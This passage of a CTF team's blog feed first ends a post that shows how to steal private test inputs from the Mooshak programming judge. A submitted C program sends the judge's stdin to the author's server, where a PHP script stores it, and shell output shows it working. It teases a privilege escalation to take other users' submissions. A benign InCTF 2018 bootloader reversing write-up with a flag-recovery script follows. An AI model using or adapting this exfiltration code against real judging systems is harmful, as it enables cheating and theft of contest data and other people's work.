class="line"></span><br><span class="line"><span class="comment">/* Returns a url-encoded version of str */</span></span><br><span class="line"><span class="comment">/* IMPORTANT: be sure to free() the returned string after use */</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">url_encode</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *pstr = str, *buf = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(str) * <span class="number">3</span> + <span class="number">1</span>), *pbuf = buf;</span><br><span class="line">  <span class="keyword">while</span> (*pstr) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isalnum</span>(*pstr) || *pstr == <span class="string">'-'</span> || *pstr == <span class="string">'_'</span> || *pstr == <span class="string">'.'</span> || *pstr == <span class="string">'~'</span>) </span><br><span class="line">      *pbuf++ = *pstr;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (*pstr == <span class="string">' '</span>) </span><br><span class="line">      *pbuf++ = <span class="string">'+'</span>;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">      *pbuf++ = <span class="string">'%'</span>, *pbuf++ = to_hex(*pstr &gt;&gt; <span class="number">4</span>), *pbuf++ = to_hex(*pstr &amp; <span class="number">15</span>);</span><br><span class="line">    pstr++;</span><br><span class="line">  &#125;</span><br><span class="line">  *pbuf = <span class="string">'\0'</span>;</span><br><span class="line">  <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Returns a url-decoded version of str */</span></span><br><span class="line"><span class="comment">/* IMPORTANT: be sure to free() the returned string after use */</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">url_decode</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *pstr = str, *buf = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(str) + <span class="number">1</span>), *pbuf = buf;</span><br><span class="line">  <span class="keyword">while</span> (*pstr) &#123;</span><br><span class="line">    <span class="keyword">if</span> (*pstr == <span class="string">'%'</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (pstr[<span class="number">1</span>] &amp;&amp; pstr[<span class="number">2</span>]) &#123;</span><br><span class="line">        *pbuf++ = from_hex(pstr[<span class="number">1</span>]) &lt;&lt; <span class="number">4</span> | from_hex(pstr[<span class="number">2</span>]);</span><br><span class="line">        pstr += <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (*pstr == <span class="string">'+'</span>) &#123; </span><br><span class="line">      *pbuf++ = <span class="string">' '</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      *pbuf++ = *pstr;</span><br><span class="line">    &#125;</span><br><span class="line">    pstr++;</span><br><span class="line">  &#125;</span><br><span class="line">  *pbuf = <span class="string">'\0'</span>;</span><br><span class="line">  <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">http_request</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span>* path, <span class="keyword">char</span>* method)</span> </span>&#123;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> *<span class="title">remote</span>;</span></span><br><span class="line">  <span class="keyword">int</span> sock;</span><br><span class="line">  <span class="keyword">int</span> tmpres;</span><br><span class="line">  <span class="keyword">char</span> *ip;</span><br><span class="line">  <span class="keyword">char</span> *get;</span><br><span class="line">  <span class="keyword">char</span> buf[BUFSIZ+<span class="number">1</span>];</span><br><span class="line">  <span class="comment">/*char webpage[1000];*/</span></span><br><span class="line">  <span class="keyword">char</span> *host = HOST;</span><br><span class="line">  <span class="keyword">char</span> *page;</span><br><span class="line">  <span class="keyword">int</span> sent = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> htmlstart = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">char</span> * htmlcontent;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(argc == <span class="number">1</span>)&#123;</span><br><span class="line">    usage();</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  host = HOST;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">"get"</span>, method) == <span class="number">0</span>)</span><br><span class="line">    page = join_strings(PAGE, url_encode(path));</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    page = PAGE;</span><br><span class="line">  sock = create_tcp_socket();</span><br><span class="line">  ip = get_ip(host);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"IP is %s\n"</span>, ip);</span><br><span class="line">  remote = (struct sockaddr_in *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct sockaddr_in *));</span><br><span class="line">  remote-&gt;sin_family = AF_INET;</span><br><span class="line">  tmpres = inet_pton(AF_INET, ip, (<span class="keyword">void</span> *)(&amp;(remote-&gt;sin_addr.s_addr)));</span><br><span class="line">  <span class="keyword">if</span>( tmpres &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(tmpres == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s is not a valid IP address\n"</span>, ip);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  remote-&gt;sin_port = htons(PORT);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span>(connect(sock, (struct sockaddr *)remote, <span class="keyword">sizeof</span>(struct sockaddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(method, <span class="string">"get"</span>) == <span class="number">0</span>) </span><br><span class="line">    get = build_get_query(host, page);</span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line">    get = build_post_query(host, page, path);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Query is:\n&lt;&lt;START&gt;&gt;\n%s&lt;&lt;END&gt;&gt;\n"</span>, get);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*Send the query to the server*/</span></span><br><span class="line">  sent = <span class="number">0</span>; </span><br><span class="line">  <span class="keyword">while</span>(sent &lt; <span class="built_in">strlen</span>(get)) &#123;</span><br><span class="line">    tmpres = send(sock, get+sent, <span class="built_in">strlen</span>(get)-sent, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(tmpres == <span class="number">-1</span>) &#123;</span><br><span class="line">     </span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sent += tmpres;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*now it is time to receive the page*/</span></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  htmlstart = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>((tmpres = recv(sock, buf, BUFSIZ, <span class="number">0</span>)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(htmlstart == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">/* Under certain conditions this will not work.</span></span><br><span class="line"><span class="comment">      * If the \r\n\r\n part is splitted into two messages</span></span><br><span class="line"><span class="comment">      * it will fail to detect the beginning of HTML content</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      htmlcontent = <span class="built_in">strstr</span>(buf, <span class="string">"\r\n\r\n"</span>);</span><br><span class="line">      <span class="keyword">if</span>(htmlcontent != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        htmlstart = <span class="number">1</span>;</span><br><span class="line">        htmlcontent += <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      htmlcontent = buf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(htmlstart) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, htmlcontent);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, tmpres);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(get);</span><br><span class="line">  <span class="built_in">free</span>(remote);</span><br><span class="line">  <span class="built_in">free</span>(ip);</span><br><span class="line">  close(sock);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"USAGE: htmlget host [page]\n\</span></span><br><span class="line"><span class="string">\thost: the website hostname. ex: coding.debuntu.org\n\</span></span><br><span class="line"><span class="string">\tpage: the page to retrieve. ex: index.html, default: /\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_tcp_socket</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sock;</span><br><span class="line">  <span class="keyword">if</span>((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sock;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">get_ip</span><span class="params">(<span class="keyword">char</span> *host)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">hent</span>;</span></span><br><span class="line">  <span class="keyword">int</span> iplen = <span class="number">15</span>; <span class="comment">/*XXX.XXX.XXX.XXX*/</span></span><br><span class="line">  <span class="keyword">char</span> *ip = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(iplen+<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">memset</span>(ip, <span class="number">0</span>, iplen+<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span>((hent = gethostbyname(host)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(inet_ntop(AF_INET, (<span class="keyword">void</span> *)hent-&gt;h_addr_list[<span class="number">0</span>], ip, iplen) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ip;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">build_get_query</span><span class="params">(<span class="keyword">char</span> *host, <span class="keyword">char</span> *page)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *query;</span><br><span class="line">  <span class="keyword">char</span> *getpage = page;</span><br><span class="line">  <span class="keyword">char</span> *tpl = <span class="string">"GET /%s HTTP/1.0\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n"</span>;</span><br><span class="line">  <span class="keyword">if</span>(getpage[<span class="number">0</span>] == <span class="string">'/'</span>) &#123;</span><br><span class="line">    getpage = getpage + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Removing leading \"/\", converting %s to %s\n"</span>, page, getpage);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* -5 is to consider the %s %s %s in tpl and the ending \0 */</span></span><br><span class="line">  query = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="built_in">strlen</span>(host)+<span class="built_in">strlen</span>(getpage)+<span class="built_in">strlen</span>(USERAGENT)+<span class="built_in">strlen</span>(tpl)<span class="number">-5</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(query, tpl, getpage, host, USERAGENT);</span><br><span class="line">  <span class="keyword">return</span> query;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">build_post_query</span><span class="params">(<span class="keyword">char</span> *host, <span class="keyword">char</span> *page, <span class="keyword">char</span> *post_data)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *query;</span><br><span class="line">  <span class="keyword">char</span> *getpage = page;</span><br><span class="line">  <span class="keyword">char</span>* url_encoded = url_encode(post_data);</span><br><span class="line">  <span class="keyword">int</span> length_data = <span class="built_in">strlen</span>(url_encoded)+<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">char</span> *tpl = <span class="string">"POST /%s HTTP/1.0\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\nfield1=%s\r\n"</span>;</span><br><span class="line">  <span class="keyword">if</span>(getpage[<span class="number">0</span>] == <span class="string">'/'</span>) &#123;</span><br><span class="line">    getpage = getpage + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Removing leading \"/\", converting %s to %s\n"</span>, page, getpage);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* -5 is to consider the %s %s %s in tpl and the ending \0 */</span></span><br><span class="line"></span><br><span class="line">  query = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="built_in">strlen</span>(host)+<span class="built_in">strlen</span>(getpage)+<span class="built_in">strlen</span>(USERAGENT)+ <span class="built_in">strlen</span>(tpl) + <span class="built_in">strlen</span>(url_encoded) + <span class="number">33</span> - <span class="number">7</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(query, tpl, getpage, host, USERAGENT, length_data+<span class="number">1</span>, url_encoded);</span><br><span class="line">  <span class="keyword">return</span> query;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">join_strings</span><span class="params">(<span class="keyword">char</span> *one, <span class="keyword">char</span> *two)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *tpl = <span class="string">"%s%s"</span>;</span><br><span class="line">  <span class="keyword">char</span> *query;</span><br><span class="line">  query = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="built_in">strlen</span>(one)+<span class="built_in">strlen</span>(two)+<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(query, tpl, one, two);</span><br><span class="line">  <span class="keyword">return</span> query;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>And the php file (named as wtf.php in this example)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>($_POST[<span class="string">'field1'</span>]) ) &#123;</span><br><span class="line">  file_put_contents(<span class="string">"input.txt"</span>, urldecode($_POST[<span class="string">'field1'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>As you can see above this is just a php script which writes the output from <strong><em>POST</em></strong> parameter into a file named <strong><em>input.txt</em></strong> that you need to create on your server too.<br>So lets test this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -O3 -ansi -Wall test.c -lm -o <span class="built_in">test</span></span><br><span class="line">$ cat input</span><br><span class="line">1 1</span><br><span class="line">2 1</span><br><span class="line">3 1</span><br><span class="line">2 4</span><br><span class="line">1 4</span><br><span class="line">$ ./<span class="built_in">test</span> &lt; input</span><br><span class="line">./<span class="built_in">test</span> &lt; input </span><br><span class="line">IP is 127.0.0.1</span><br><span class="line">Removing leading <span class="string">"/"</span>, converting /wtf.php to wtf.php</span><br><span class="line">Query is:</span><br><span class="line">&lt;&lt;START&gt;&gt;</span><br><span class="line">POST /wtf.php HTTP/1.0</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: HTMLGET 1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 17</span><br><span class="line"></span><br><span class="line">field1=---------------</span><br><span class="line">&lt;&lt;END&gt;&gt;</span><br><span class="line">IP is 127.0.0.1</span><br><span class="line">Removing leading <span class="string">"/"</span>, converting /wtf.php to wtf.php</span><br><span class="line">Query is:</span><br><span class="line">&lt;&lt;START&gt;&gt;</span><br><span class="line">POST /wtf.php HTTP/1.0</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: HTMLGET 1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 57</span><br><span class="line"></span><br><span class="line">field1=1%2b1%250a2%2b1%250a3%2b1%250a2%2b4%250a1%2b4%250a%250a</span><br><span class="line">&lt;&lt;END&gt;&gt;</span><br></pre></td></tr></table></figure><p>And now checking the server files:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/var/www/html</span><br><span class="line">$ ls</span><br><span class="line">index.cgi  input.txt  wtf.php</span><br><span class="line">$ cat input.txt </span><br><span class="line">1 1</span><br><span class="line">2 1</span><br><span class="line">3 1</span><br><span class="line">2 4</span><br><span class="line">1 4</span><br></pre></td></tr></table></figure><p>And we can see it works perfectly like this you can steal any private test input from mooshak. You may be asking if there is a way to get the output as well and the answer for now is actually no, but I’m currently researching a way to do this and I can say I’m very near to actually do it and if successful I can not only get the test outputs but the other user project submissions as well, the process to do this is an actual hack which involves privilege escalation so stay tuned for more posts. </p><p>If you liked this post please follow us in twitter and consider joining our CTF team. </p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;A long time ago in a secret meme group far far away I did find this:&lt;/p&gt;
&lt;p&gt;&lt;a data-fancybox=&quot;gallery&quot; href=&quot;https://i.imgur.com/Be1WLE5.
      
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="mooshak" scheme="https://teamrocketist.github.io/tags/mooshak/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] InCTF 2018 - load3r</title>
    <link href="https://teamrocketist.github.io/2018/10/11/Reverse-InCTF-2018-load3r/"/>
    <id>https://teamrocketist.github.io/2018/10/11/Reverse-InCTF-2018-load3r/</id>
    <published>2018-10-11T03:56:04.000Z</published>
    <updated>2018-10-24T23:21:04.822Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br><br>load3r<br>100<br><br>======= Difficulty level : Easy ========<br><br>A basic bootloader challenge. Note: The flag format is inctf{correct_input}<br><br>Note: The challenge must be run in qemu-system-i386 version 2.5.0<br><br>========== Authors : b3y0nd3r, r00tus3r ==========<br></blockquote><p>They gave us a file named <em>boot sector</em><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file boot_try.bin </span><br><span class="line">boot_try.bin: DOS/MBR boot sector</span><br></pre></td></tr></table></figure></p><p>So lets first run the binary on an emulator named qemu:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-system-i386 -drive format=raw,file=boot_try.bin</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/8Wt66UE.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/8Wt66UE.png" alt=""><br></a></p><p>We can see some strings like <strong><em>ENTER THE FLAG</em></strong> and the message <strong><em>NOOOO</em></strong> when we insert an incorrect flag, this strings can help us to localize certain parts of the code while reversing, so first thing I did was to look up for this strings in IDA and search on which zones they are referenced.</p><p>At first I was having some trouble with IDA because I was choosing the wrong architecture when opening the binary and IDA wasn’t able to disassemble the code, the only thing that was showing was the strings so make sure you <strong><em>say no</em></strong> to disassemble the binary in 16 bits instead of the 32 bits.</p><p><a data-fancybox="gallery" href="https://i.imgur.com/4kHWAD5.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/4kHWAD5.png" alt=""><br></a></p><p>After pressing no, we can already see where is the location of the strings we saw when executing the binary… </p><p><a data-fancybox="gallery" href="https://i.imgur.com/d97jqKF.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/d97jqKF.png" alt=""><br></a></p><p>So we can start taking some notes from where they start in the binary (note that since the boot sector hasn’t been loaded into memory by the bios, all the addresses are starting from 0 but when we start debugging it everything will start after 0x7c00):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7c16 ENTER THE FLAG\r\n -&gt; calculated with 0x7c00 + 0x16</span><br><span class="line">0x7c27 w2g1kS&lt;c7me3keeuSMg1kSk%Se&lt;=S3%/e/\r\n -&gt; calculated with 0x7c00 + 0x27</span><br><span class="line">0x7c4c Yeah, that is the flag\r\n -&gt; calculated with 0x7c00 + 0x4c</span><br><span class="line">0x7c65 8 7 NOOOO\r\n -&gt; calculated with 0x7c00 + 0x65</span><br><span class="line">0x7cc9 37 36 0100010011011101111111011010110101\r\n -&gt; calculated with 0x7c00 + 0xc9</span><br></pre></td></tr></table></figure><p>Now we have 2 subroutines to analyse, lets start by the smallest one:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/paHB5U2.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/paHB5U2.png" alt=""><br></a></p><p>IDA’s comments are very explanatory, this is a function that writes a character into the screen by performing an interruption, so we can just rename this function to print since will be easier to us to identify it when it is called again.</p><p><a data-fancybox="gallery" href="https://i.imgur.com/tqpZzRW.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/tqpZzRW.png" alt=""><br></a></p><p>From the image above we can already assume that the flag must have 34 characters if we insert something that doesn’t have that size we go directly to printing the wrong flag message <strong><em>NOOO</em></strong>.</p><p><a data-fancybox="gallery" href="https://i.imgur.com/GqA9h8v.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/GqA9h8v.png" alt=""><br></a></p><p>But if we instead give a 34 character string we go through the green flow</p><p><a data-fancybox="gallery" href="https://i.imgur.com/tiKrTXA.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/tiKrTXA.png" alt=""><br></a></p><p>The image above is a loop, which iterates all the characters we inserted in the program, after doing the shifts we enter into the final character modification:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/ehuu9Gc.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/ehuu9Gc.png" alt=""><br></a></p><p>We need to reverse this encryption function by doing exactly the opposite:</p><p>Example<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">encryption function -&gt; </span><br><span class="line">lr_string = &apos;0&apos;</span><br><span class="line">flag_string = &apos;T&apos;</span><br><span class="line">for the first character (shift right because the 1st of lr_string is zero):</span><br><span class="line">chr((ord(&apos;T&apos;) &gt;&gt; 1 ) ^ 5) = /</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reverse function -&gt; </span><br><span class="line">lr_string = &apos;0&apos;</span><br><span class="line">encryption_string = &apos;/&apos;</span><br><span class="line">for the first character (shift left because we are reversing it and before we shift righted):</span><br><span class="line">chr((ord(&apos;/&apos;) ^ 5) &lt;&lt; 1) = T</span><br></pre></td></tr></table></figure><p>Of course it’s much easier to understand all this assembly while debugging and analysing the code… the way I did it was opening gdb and running this commands inside of it, after the commands bellow is just a matter of putting more breakpoints and reading registers etc etc:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">target remote | qemu-system-i386 -S -gdb stdio -m 512 -hda boot_try.bin</span><br><span class="line"><span class="built_in">set</span> architecture i8086</span><br><span class="line">b *0x7c00</span><br></pre></td></tr></table></figure><p>We have now everything to recover the flag it’s trivial to write a python script that recovers the flag for us:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">left_or_right = <span class="string">'0100010011011101111111011010110101'</span></span><br><span class="line">enc = <span class="string">"\x77\x32\x67\x31\x6B\x53\x3C\x63\x37\x6D\x65\x33\x6B\x65\x65\x75\x53\x4D\x67\x31\x6B\x53\x6B\x25\x53\x65\x3C\x3D\x53\x33\x25\x2F\x65\x2F"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> enumerate(enc[::<span class="number">-1</span>]):</span><br><span class="line">    a = ord(c) ^ <span class="number">5</span></span><br><span class="line">    <span class="keyword">if</span> left_or_right[i] == <span class="string">'0'</span>:</span><br><span class="line">        flag += chr(a &lt;&lt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += chr(a &gt;&gt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'inctf&#123;'</span>+flag+<span class="string">'&#125;'</span></span><br></pre></td></tr></table></figure><p>Running it</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python final.py</span><br><span class="line">inctf&#123;T0T@l+pr0+@7+7h1$+8007l04d3r+7h1n9&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;&lt;br&gt;load3r&lt;br&gt;100&lt;br&gt;&lt;br&gt;======= Difficulty level : Easy ========&lt;br&gt;&lt;br&gt;A basic bootloader challenge. Note: The flag format
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="InCTF2018" scheme="https://teamrocketist.github.io/tags/InCTF2018/"/>
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="qemu" scheme="https://teamrocketist.github.io/tags/qemu/"/>
    
      <category term="i386" scheme="https://teamrocketist.github.io/tags/i386/"/>
    
      <category term="mbr" scheme="https://teamrocketist.github.io/tags/mbr/"/>
    
      <category term="boot_sector" scheme="https://teamrocketist.github.io/tags/boot-sector/"/>
    
  </entry>
  
  <entry>
    <title>[Forensics] InCTF 2018 - Winter Sport</title>
    <link href="https://teamrocketist.github.io/2018/10/09/Forensics-InCTF-2018-Winter-Sport/"/>
    <id>https://teamrocketist.github.io/2018/10/09/Forensics-InCTF-2018-Winter-Sport/</id>
    <published>2018-10-09T21:00:56.000Z</published>
    <updated>2018-10-24T23:21:04.822Z</updated>
    
